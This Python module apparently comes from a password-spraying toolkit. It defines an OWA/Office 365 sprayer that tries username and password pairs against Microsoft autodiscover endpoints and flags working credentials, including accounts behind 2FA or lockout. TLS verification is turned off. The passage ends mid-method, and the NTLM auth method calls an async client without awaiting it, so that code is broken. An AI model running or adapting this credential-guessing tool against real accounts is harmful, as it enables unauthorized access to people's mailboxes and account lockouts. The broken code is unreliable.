import ssl
import httpx
import asyncio
import logging
import functools
from typing import List, Union
from urllib.parse import urlparse
from httpx_ntlm import HttpNtlmAuth
from sprayingtoolkit.models import HostingLocation
from sprayingtoolkit.base import BaseSprayer

log = logging.getLogger("atomizer.modules.owa.sprayer")


class OwaSprayer(BaseSprayer):
    def __init__(self, target, hosting_location, autodiscover_url):
        super().__init__()

        self.target = target
        self.hosting_location = hosting_location
        self.autodiscover_url = autodiscover_url

        self.headers = {"Content-Type": "text/xml"}
        self.client = httpx.AsyncClient(
            verify=False, trust_env=True, http2=True, headers=self.headers
        )

    async def shutdown(self):
        await self.client.aclose()

    async def auth_o365(self, username, password):
        result = {
            "status_code": None,
            "valid": False,
            "reason": "",
            "error": "",
        }

        r = await self.client.get(
            "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml",
            auth=(username, password),
        )

        result["status_code"] = r.status_code
        if r.status_code == 200:
            result["valid"] = True
            result["reason"] = "HTTP response code 200"
        elif r.status_code == 456:
            result["valid"] = True
            result["reason"] = "Credentials valid but must be checked manually (2FA, account locked, etc...)"
        else:
            result["reason"] = "Bad HTTP status code"

        return result

    async def auth(self, username, password):
        result = {
            "status_code": None,
            "valid": False,
            "reason": "",
            "error": "",
        }

        r = self.client.get(
            self.autodiscover_url, auth=HttpNtlmAuth(username, password)
        )

        result["status_code"] = r.status_code
        if r.status_code == 200:
            result["valid"] = True
            result["reason"] = "HTTP response code 200"
        else:
            result["reason"] = "Bad HTTP status code"
